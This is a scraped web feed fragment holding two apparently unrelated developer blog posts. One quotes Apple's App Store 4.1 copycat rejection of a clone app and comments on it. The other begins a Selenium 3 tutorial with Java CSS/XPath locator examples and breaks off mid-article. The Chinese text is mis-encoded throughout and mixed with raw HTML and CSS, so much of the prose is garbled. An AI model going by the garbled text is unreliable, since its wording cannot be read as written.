.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>2026å¹´å¼€ç›˜ç¬¬ä¸€åé»‘é©¬APP-æ­»äº†ä¹ˆã€‚è™½ç„¶çƒ­åº¦å¤§ä¸å¦‚å‰äº›æ—¶æ—¥ï¼Œæµé‡çš„çº¢åˆ©å¯è°“ä¾æ—§åœ¨ã€‚</p>
<p>æ‰€ä»¥é—²æ¥æ— äº‹ï¼Œæˆ‘ä¹Ÿä»¿åˆ¶ä¸€ä¸ªèµå“çš„<code>'æ­»äº†ä¹ˆ'</code>ï¼Œæ²¡æƒ³åˆ°å‡ºå¸ˆæœªæ·èº«å…ˆæ­»ï¼</p>
<p><strong>è‹¹æœè¢«æ‹’åŸæ–‡</strong></p>
<pre><code class="hljs language-vbnet" lang="vbnet">Hello, 

Thank you <span class="hljs-keyword">for</span> submitting the <span class="hljs-built_in">new</span> app, xäº†ä¹ˆ - å®˜æ–¹æ–°ç‰ˆå‘Šåˆ«æ­»äº†ä¹ˆ, <span class="hljs-keyword">for</span> review. We noticed some issues that require your attention. Please see below <span class="hljs-keyword">for</span> additional information.

<span class="hljs-keyword">If</span> you have any questions, we are here <span class="hljs-keyword">to</span> help. Reply <span class="hljs-keyword">to</span> this message <span class="hljs-keyword">in</span> App Store Connect <span class="hljs-built_in">and</span> <span class="hljs-keyword">let</span> us know.

Review Environment

Submission ID: c48b1695-<span class="hljs-number">9</span>cc0-<span class="hljs-number">45</span>a8-<span class="hljs-number">975</span>f-b6ac60ce455d
Review <span class="hljs-type">date</span>: January <span class="hljs-number">15</span>, <span class="hljs-number">2026</span>
Review Device: iPad Air <span class="hljs-number">11</span>-inch (M3)
Version reviewed: <span class="hljs-number">1.0</span>.<span class="hljs-number">0</span>


Guideline <span class="hljs-number">4.1</span> - Design - Copycats

The app<span class="hljs-comment">'s metadata contains third-party content similar to a popular app or game already available on the App Store, from a developer's website or distribution source, or from a third-party platform. This creates a misleading association with another developer's app or intellectual property. </span>

Specifically, the app<span class="hljs-comment">'s name includes references to æ­»äº†ä¹ˆ.</span>

<span class="hljs-keyword">Next</span> Steps

It would be appropriate <span class="hljs-keyword">to</span> revise the app <span class="hljs-built_in">and</span> metadata <span class="hljs-keyword">to</span> remove this third-party content before resubmitting <span class="hljs-keyword">for</span> review. 

<span class="hljs-keyword">If</span> you have the necessary rights <span class="hljs-keyword">to</span> distribute an app <span class="hljs-keyword">with</span> this third-party content, attach documentary evidence <span class="hljs-keyword">in</span> the App Review Information section <span class="hljs-keyword">in</span> App Store Connect <span class="hljs-built_in">and</span> reply <span class="hljs-keyword">to</span> this message. 

Resources

Many factors may contribute <span class="hljs-keyword">to</span> a guideline <span class="hljs-number">4.1</span> rejection, including but <span class="hljs-built_in">not</span> limited <span class="hljs-keyword">to</span> the following examples:

- <span class="hljs-keyword">Using</span> the app metadata <span class="hljs-built_in">or</span> developer account information <span class="hljs-keyword">to</span> create a misleading association <span class="hljs-keyword">with</span> another app.
- Including irrelevant references <span class="hljs-keyword">to</span> popular apps <span class="hljs-keyword">in</span> an app<span class="hljs-comment">'s name or subtitle.</span>
- Copying the content, features, <span class="hljs-built_in">and</span> user <span class="hljs-keyword">interface</span> <span class="hljs-keyword">of</span> popular apps.

Learn more about guideline <span class="hljs-number">4.1</span>. Visit Preventing Copycat <span class="hljs-built_in">and</span> Impersonation Rejections <span class="hljs-keyword">to</span> learn best practices that will help you submit apps that follow this guideline.

Support
- Reply <span class="hljs-keyword">to</span> this message <span class="hljs-keyword">in</span> your preferred language <span class="hljs-keyword">if</span> you need assistance. <span class="hljs-keyword">If</span> you need additional support, use the Contact Us <span class="hljs-keyword">module</span>.
- Consult <span class="hljs-keyword">with</span> fellow developers <span class="hljs-built_in">and</span> Apple engineers <span class="hljs-keyword">on</span> the Apple Developer Forums.
- Provide feedback <span class="hljs-keyword">on</span> this message <span class="hljs-built_in">and</span> your review experience <span class="hljs-keyword">by</span> completing a <span class="hljs-type">short</span> survey.
</code></pre>
<p><strong>åŸæ–‡åˆ†æ</strong></p>
<p>å¯¹äºAppStoreæ¥è¯´ï¼Œ<code>'æ­»äº†ä¹ˆ'</code>è¿™ç§äº§å“å·²ç»æˆä¸ºäº†æµè¡Œè¯ + å“ç‰Œè¯ã€‚AppStoreä¸€è´¯çš„é£æ ¼å°±æ˜¯ï¼Œ<code>ä¿æŠ¤å…ˆåƒèƒèŸ¹çš„äºº</code>ã€‚</p>
<p>æ‰€ä»¥å®¢è§‚æ¥è¯´ï¼Œä¸ç®¡æ˜¯<strong>4.3a</strong> è¿˜æ˜¯ <strong>4.1</strong>ï¼Œåº•å±‚é€»è¾‘éƒ½æ˜¯å¯¹äºAppStoreç¯å¢ƒçš„å‡€åŒ–ã€‚</p>
<h3 data-id="heading-1">æœç»â€œè¯¯å¯¼æ€§å…³è”â€</h3>
<p>App Store 4.1æ¡æ¬¾å¹¶éç¦æ­¢æ‰€æœ‰ç¬¬ä¸‰æ–¹å†…å®¹å¼•ç”¨ï¼Œæ ¸å¿ƒæ˜¯æ‰“å‡»æ— åˆæ³•æˆæƒçš„â€œä»¿å†’å¼å…³è”â€ï¼Œæœç»ä¾µå ä»–äººçŸ¥è¯†äº§æƒã€è¯¯å¯¼ç”¨æˆ·åˆ¤æ–­çš„è¡Œä¸ºã€‚åªè¦å…ƒæ•°æ®æˆ–äº§å“å½¢æ€æ˜“å…³è”çƒ­é—¨å“ç‰Œï¼Œå³å¯èƒ½è¢«æ‹’æ­¤ç±»è¿è§„ã€‚</p>
<h3 data-id="heading-2">æ‹’ç»â€œä¾¥å¹¸è¹­æµâ€</h3>
<p>è¿™ç§è¹­æµé‡ç±»å‹çš„äº§å“ï¼Œ<code>æœ¬è´¨ä¸Šè¦ä¹ˆæ˜¯ä»˜è´¹æ”¶å‰²ï¼Œè¦ä¹ˆæ˜¯å¹¿å‘Šå˜ç°</code>ã€‚åŒæ—¶ï¼Œä¹Ÿæ˜¯æœ€æœ‰å¯èƒ½æŸ“æŒ‡3.2fç±»å‹çš„äº§å“ã€‚</p>
<p>åœ¨è¿™ç§èƒŒæ™¯ä¸‹ï¼Œæ˜¯ææ˜“å®¹æ˜“è¢«è‹¹æœåˆ¤å®šä¸ºç›¸åŒç±»å‹çš„å›¢é˜Ÿï¼Œåœ¨å¤åˆ»è¢«å°å·ä¸‹æ¶çš„äº§å“ã€‚</p>
<p><code>éµå®ˆè§„åˆ™ï¼Œæ–¹å¾—é•¿æ²»ä¹…å®‰</code>ï¼Œæœ€åç¥å¤§å®¶å¤§å‰å¤§åˆ©ï¼Œä»Šæ™šè¿‡å®¡ï¼</p>
<h3 data-id="heading-3">ç›¸å…³æ¨è</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FURmC_4vxQv5ttOg8yYe7Eg" target="_blank" title="https://mp.weixin.qq.com/s/URmC_4vxQv5ttOg8yYe7Eg" ref="nofollow noopener noreferrer"># è‹¹æœå¼€å‘è€…ç»­è´¹å¤§å‘åŠæˆåŠŸç»­è´¹æ–¹æ¡ˆï¼äº²æµ‹æœ‰æ•ˆ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F1bAA90Tzpx03tTHZbdg3aw" target="_blank" title="https://mp.weixin.qq.com/s/1bAA90Tzpx03tTHZbdg3aw" ref="nofollow noopener noreferrer"># AppStoreæ•æ„Ÿè¯æ’æŸ¥æ‰‹å†Œï¼Œå¤šç»´åº¦åˆ†æGuideline 2.3.1éšè—åŠŸèƒ½ï¼Œè½»æ¾è¿‡å®¡ã€‚</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FV2F4BaEYh5HfeUUHm1tI6Q" target="_blank" title="https://mp.weixin.qq.com/s/V2F4BaEYh5HfeUUHm1tI6Q" ref="nofollow noopener noreferrer"># å¦‚ä½•ä¸»åŠ¨æé˜²è‹¹æœ3.2fçš„è¿›æ”»ï¼Œè‡ªæŸ¥é˜²å¾¡æ‰‹å†Œï¼ˆä»£ç ç¯‡ï¼‰</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FLs3su8fmMckTocPwMmFaNQ" target="_blank" title="https://mp.weixin.qq.com/s/Ls3su8fmMckTocPwMmFaNQ" ref="nofollow noopener noreferrer"># å¦‚ä½•ä¸»åŠ¨æé˜²è‹¹æœ3.2fçš„è¿›æ”»ï¼Œè‡ªæŸ¥é˜²å¾¡æ‰‹å†Œï¼ˆASOç¯‡ï¼‰</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484371%26idx%3D1%26sn%3D33568c58e90a5bf4d2612d803ecb2a27%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484371&amp;idx=1&amp;sn=33568c58e90a5bf4d2612d803ecb2a27&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># è‹¹æœåŠ æ€¥å®¡æ ¸æ˜¯â€œç»¿è‰²é€šé“â€è¿˜æ˜¯â€œæ­»äº¡é™·é˜±â€ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484362%26idx%3D1%26sn%3Dea61bd42d5ae8b99d2a56cbfb8d91e88%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484362&amp;idx=1&amp;sn=ea61bd42d5ae8b99d2a56cbfb8d91e88&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># è‹¹æœå¼€å‘è€…é‚®ç®±ï¼Œçªç„¶æ”¶åˆ°11.2é€šçŸ¥ä¸¥é‡ä¹ˆï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484413%26idx%3D1%26sn%3D82870d4c8892fa65803a8e05fd5ac938%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484413&amp;idx=1&amp;sn=82870d4c8892fa65803a8e05fd5ac938&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># ä¸æƒ³è¢«è‹¹æœå¡å®¡æœ€å¥½é”™å¼€è¿™ä¸¤ä¸ªæå®¡æ—¶é—´</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484349%26idx%3D1%26sn%3D1c75a6b08cb5de64ddf41a88b61ff108%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484349&amp;idx=1&amp;sn=1c75a6b08cb5de64ddf41a88b61ff108&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># æ‰‹æ’•è‹¹æœå®¡æ ¸4.3æ˜¯ä»£ç é—®é¢˜è¿˜æ˜¯è®¾è®¡é—®é¢˜ï¼Ÿ</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484344%26idx%3D1%26sn%3D4399eb8d8bf82e9c5df26a18b8564cfb%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484344&amp;idx=1&amp;sn=4399eb8d8bf82e9c5df26a18b8564cfb&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># æœ‰å¹¸å’ŒAppstoreå®¡æ ¸äººå‘˜è¿›è¡Œäº†ä¸€åœºè§†é¢‘ä¼šè®®ç‰¹æ­¤è®°å½•ã€‚</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Selenium3+Pytest+Allureè½åœ°Python Webè‡ªåŠ¨åŒ–æµ‹è¯•ï¼ˆ15ç« å·²å®Œç»“ï¼‰]]></title>    <link>https://juejin.cn/post/7597024900522016820</link>    <guid>https://juejin.cn/post/7597024900522016820</guid>    <pubDate>2026-01-20T10:18:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597024900522016820" data-draft-id="7597270795211669544" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Selenium3+Pytest+Allureè½åœ°Python Webè‡ªåŠ¨åŒ–æµ‹è¯•ï¼ˆ15ç« å·²å®Œç»“ï¼‰"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-20T10:18:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·01883123795"/> <meta itemprop="url" content="https://juejin.cn/user/2420462317479864"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Selenium3+Pytest+Allureè½åœ°Python Webè‡ªåŠ¨åŒ–æµ‹è¯•ï¼ˆ15ç« å·²å®Œç»“ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2420462317479864/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·01883123795
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:18:55.000Z" title="Tue Jan 20 2026 10:18:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>Selenium3+Pytest+Allureè½åœ°Python Webè‡ªåŠ¨åŒ–æµ‹è¯•---xingkeit.top/7734/</strong></p>
<h2 data-id="heading-0">Selenium3 çš„å®šä½èƒ½åŠ›ä¼˜åŠ¿ï¼šè½»æ¾åº”å¯¹å¤æ‚é¡µé¢</h2>
<p>åœ¨ç°ä»£ Web è‡ªåŠ¨åŒ–æµ‹è¯•ä¸­ï¼Œé¢å¯¹æ—¥ç›Šå¤æ‚çš„é¡µé¢ç»“æ„â€”â€”æ— è®ºæ˜¯åµŒå¥—å¤šå±‚çš„åŠ¨æ€ Divã€åŠ¨æ€ç”Ÿæˆçš„è¡¨æ ¼ï¼Œè¿˜æ˜¯æ·±ä¸è§åº•çš„ Shadow DOMï¼ˆå½±å­ DOMï¼‰â€”â€”ç²¾å‡†æ‰¾åˆ°é¡µé¢å…ƒç´ å¾€å¾€æ˜¯æµ‹è¯•å·¥ç¨‹å¸ˆæœ€å¤§çš„ç—›ç‚¹ã€‚</p>
<p>Selenium 3 ä¹‹æ‰€ä»¥ä¹…ç»ä¸è¡°ï¼Œæ ¸å¿ƒä¼˜åŠ¿ä¹‹ä¸€å°±åœ¨äºå®ƒæä¾›äº†<strong>æå…¶ä¸°å¯Œä¸”çµæ´»çš„å…ƒç´ å®šä½ç­–ç•¥</strong>ã€‚å®ƒä¸ä»…æ”¯æŒåŸºç¡€çš„ ID å’Œ XPathï¼Œæ›´å¼•å…¥äº†å¼ºå¤§çš„ CSS é€‰æ‹©å™¨å’Œå±‚çº§å®šä½é€»è¾‘ï¼Œèƒ½åƒæ‰‹æœ¯åˆ€ä¸€æ ·ç²¾å‡†å‰–æå¤æ‚é¡µé¢ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€ åº”å¯¹åŠ¨æ€å±æ€§ï¼šçµæ´»çš„ CSS ä¸ XPath</h3>
<p>åœ¨å•é¡µåº”ç”¨ï¼ˆSPAï¼‰ä¸­ï¼Œå…ƒç´ çš„Â <code>id</code>Â æˆ–Â <code>class</code>Â å¾€å¾€æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼ˆå¦‚Â <code>class="btn-3f9a12"</code>ï¼‰ï¼Œç›´æ¥ç¡¬ç¼–ç å¿…ç„¶å¤±è´¥ã€‚Selenium 3 çš„ä¼˜åŠ¿åœ¨äºä½ å¯ä»¥åˆ©ç”¨<strong>éƒ¨åˆ†åŒ¹é…</strong>å’Œ<strong>å±‚çº§å…³ç³»</strong>æ¥é”å®šå…ƒç´ ã€‚</p>
<h4 data-id="heading-2">åœºæ™¯ï¼šå¿½ç•¥åŠ¨æ€ç±»åï¼Œå®šä½ç‰¹å®šæŒ‰é’®</h4>
<p>å‡è®¾é¡µé¢ä¸­æœ‰å¤šä¸ªæŒ‰é’®ï¼Œä½†æˆ‘ä»¬åªæƒ³ç‚¹å‡»â€œæäº¤â€æŒ‰é’®ï¼Œä¸”å®ƒçš„ class åŒ…å«åŠ¨æ€å“ˆå¸Œå€¼ã€‚</p>
<p>java</p>
<p>å¤åˆ¶</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.openqa.selenium.By;
<span class="hljs-keyword">import</span> org.openqa.selenium.WebDriver;
<span class="hljs-keyword">import</span> org.openqa.selenium.WebElement;
<span class="hljs-keyword">import</span> org.openqa.selenium.chrome.ChromeDriver;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DynamicLocatorDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">WebDriver</span> <span class="hljs-variable">driver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChromeDriver</span>();
        driver.get(<span class="hljs-string">"https://example.com/form"</span>) ;

        <span class="hljs-comment">// ç­–ç•¥ 1ï¼šä½¿ç”¨ CSS åŒ…å«åŒ¹é… (^= è¡¨ç¤ºä»¥...å¼€å¤´ï¼Œ*= è¡¨ç¤ºåŒ…å«)</span>
        <span class="hljs-comment">// å³ä½¿ class å˜æˆäº† "btn-submit-x7k9L"ï¼Œä¹Ÿèƒ½å®šä½åˆ°</span>
        <span class="hljs-type">WebElement</span> <span class="hljs-variable">submitBtn</span> <span class="hljs-operator">=</span> driver.findElement(
            By.cssSelector(<span class="hljs-string">"button[class^='btn-submit']"</span>)
        );
        submitBtn.click();

        <span class="hljs-comment">// ç­–ç•¥ 2ï¼šä½¿ç”¨ XPath çš„æ–‡æœ¬å®šä½ï¼Œå®Œå…¨æ— è§†æ ·å¼å’Œ ID</span>
        <span class="hljs-comment">// è¿™æ˜¯ä¸€ä¸ªæå…¶å¼ºå¤§çš„â€œå®¹é”™â€æ‰‹æ®µï¼Œåªè¦é¡µé¢æ–‡æ¡ˆä¸å˜ï¼Œä»£ç å°±ä¸ä¼šå´©</span>
        <span class="hljs-type">WebElement</span> <span class="hljs-variable">loginBtn</span> <span class="hljs-operator">=</span> driver.findElement(
            By.xpath(<span class="hljs-string">"//button[contains(text(), 'ç™» å½•')]"</span>)
        );
        loginBtn.click();
        
        driver.quit();
    }
}
</code></pre>
<h3 data-id="heading-3">äºŒã€ åº”å¯¹å¤æ‚è¡¨æ ¼ï¼šè½´å®šä½çš„é™ç»´æ‰“å‡»</h3>
<p>è¿™æ˜¯ Selenium 3 ç›¸æ¯” Playwright ç­‰æ–°å·¥å…·æœ€å…·â€œæå®¢èŒƒå„¿â€çš„ä¼˜åŠ¿ã€‚åœ¨å¤„ç†å¤æ‚çš„åµŒå¥—è¡¨æ ¼æ—¶ï¼Œå•çº¯é ç´¢å¼•å®šä½éå¸¸è„†å¼±ã€‚åˆ©ç”¨ XPath çš„<strong>è½´å®šä½</strong>ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºâ€œå·²çŸ¥å…ƒç´ â€æ‰¾åˆ°â€œæœªçŸ¥å…ƒç´ â€ã€‚</p>
<h4 data-id="heading-4">åœºæ™¯ï¼šæ‰¾åˆ°â€œç”¨æˆ·åâ€æ‰€åœ¨è¡Œï¼Œç‚¹å‡»è¯¥è¡Œçš„â€œç¼–è¾‘â€æŒ‰é’®</h4>
<p>å¦‚æœè¡¨æ ¼ç»“æ„æ˜¯ï¼š<br/>
<code>&lt;tr&gt;&lt;td&gt;å¼ ä¸‰&lt;/td&gt;&lt;td&gt;&lt;input type='button' value='ç¼–è¾‘'&gt;&lt;/td&gt;&lt;/tr&gt;</code></p>
<p>æˆ‘ä»¬åªçŸ¥é“ç”¨æˆ·å«â€œå¼ ä¸‰â€ï¼Œä¸çŸ¥é“ä»–åœ¨ç¬¬å‡ è¡Œã€‚</p>
<p>java</p>
<p>å¤åˆ¶</p>
<pre><code class="hljs language-ini" lang="ini">public class ComplexTableDemo {
    public static void main(String<span class="hljs-section">[]</span> args) {
        WebDriver <span class="hljs-attr">driver</span> = new ChromeDriver()<span class="hljs-comment">;</span>
        driver.get("https://example.com/user-table") <span class="hljs-comment">;</span>

        // 1. å…ˆæ‰¾åˆ°åŒ…å«æ–‡æœ¬ "å¼ ä¸‰" çš„å•å…ƒæ ¼
        // 2. åˆ©ç”¨ parent:: è·å–å…¶çˆ¶èŠ‚ç‚¹ (tr)
        // 3. åˆ©ç”¨ descendant-or-self:: æ‰¾åˆ°è¯¥è¡Œå†…çš„ç¼–è¾‘æŒ‰é’®
        
        String <span class="hljs-attr">xpathQuery</span> = <span class="hljs-string">"//td[contains(text(), 'å¼ ä¸‰')]/parent::tr//input[@value='ç¼–è¾‘']"</span><span class="hljs-comment">;</span>
        
        WebElement <span class="hljs-attr">editButton</span> = driver.findElement(By.xpath(xpathQuery))<span class="hljs-comment">;</span>
        
        // æˆ–è€…æ›´å¤æ‚çš„è½´å®šä½é€»è¾‘ï¼š
        // æ‰¾åˆ°å¼ ä¸‰çš„å•å…ƒæ ¼ -&gt; æ‰¾åˆ°å®ƒçš„çˆ¶çº§è¡Œ -&gt; æ‰¾åˆ°è¯¥è¡Œä¸‹çš„ç¬¬ 3 ä¸ªå•å…ƒæ ¼
        String <span class="hljs-attr">advancedQuery</span> = <span class="hljs-string">"//td[text()='å¼ ä¸‰']/parent::tr/td[3]/a"</span><span class="hljs-comment">;</span>
        
        WebElement <span class="hljs-attr">detailLink</span> = driver.findElement(By.xpath(advancedQuery))<span class="hljs-comment">;</span>
        detailLink.click()<span class="hljs-comment">;</span>
        
        driver.quit()<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h3 data-id="heading-5">ä¸‰ã€ åº”å¯¹å±‚çº§ç»“æ„ï¼šçˆ¶å­çº§ä¸å…„å¼Ÿçº§è”æŸ¥æ‰¾</h3>
